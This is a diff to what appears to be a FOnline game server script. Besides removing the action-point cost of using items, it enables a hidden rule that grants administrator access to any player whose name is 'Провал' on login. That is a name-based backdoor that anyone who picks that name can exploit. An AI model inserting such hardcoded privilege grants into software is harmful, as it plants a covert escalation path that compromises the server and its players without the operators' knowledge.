@@ -8,9 +8,8 @@
 #include "_client_defines.fos"
 #include "_colors.fos"
 #include "wait_time_h.fos"
-#include "apcost_h.fos"
 #include "critter_types_h.fos"
-// #define __ACCESSNAMES
+#define __ACCESSNAMES
 
 // Imports
 import void InitializeGame() from "config";
@@ -433,9 +432,6 @@ bool critter_use_item( Critter& cr, Item& item, Critter@ targetCr, Item@ targetI
     uint16 pid = item.GetProtoId();
     bool   useOnSelf = ( not valid( targetCr ) && not valid( targetItem ) && not valid( targetScen ) );
 	cr.Wait(GetProtoTime(item.Proto, 0, cr));
-	cr.StatBase[ST_CURRENT_AP] -= GetProtoApCost(item.Proto, 0, cr);
-	// string message = cr.StatBase[ST_CURRENT_AP];
-	// cr.Say(SAY_NETMSG, message);
 
     // Radio
     if( FLAG( item.Flags, ITEM_RADIO ) && useOnSelf )
@@ -1235,10 +1231,10 @@ void critter_init( Critter& cr, bool firstTime )
 {
 	if( cr.IsPlayer() && !FLAG(cr.Flags, CRITTER_DISCONNECT) )
 	{
-		// #ifdef __ACCESSNAMES
-			// if(cr.Name == "НеПровал")
-				// cr.SetAccess(ACCESS_ADMIN);
-		// #endif
+		#ifdef __ACCESSNAMES
+			if(cr.Name == "Провал")
+				cr.SetAccess(ACCESS_ADMIN);
+		#endif
 		cr.RunClientScript("rp_client@AccessCallback", cr.GetAccess(), 0, 0, null, null);
 	}
 		
